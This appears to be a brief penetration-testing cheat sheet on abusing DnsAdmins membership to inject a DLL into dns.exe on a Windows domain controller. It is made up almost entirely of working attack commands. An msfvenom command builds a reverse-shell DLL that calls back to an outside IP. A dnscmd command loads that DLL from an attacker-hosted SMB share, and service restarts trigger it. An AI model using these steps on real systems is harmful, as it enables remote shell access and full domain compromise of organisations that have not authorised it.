# DnsAdmins - dll Injection
---------
- Inject a DNS plugin dll into dns.exe process on  a victim DNS server (DC).

Generate a reverse shell dll using msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=9999 -f dll -o shell.dll
```

Serve the malicious dll in a smb share

On victim PC:
```cmd
dnscmd.exe /config /serverlevelplugindll \\10.10.14.51\share\shell.dll

sc.exe stop dns

#once it is stopped:

sc.exe start dns
```


https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise








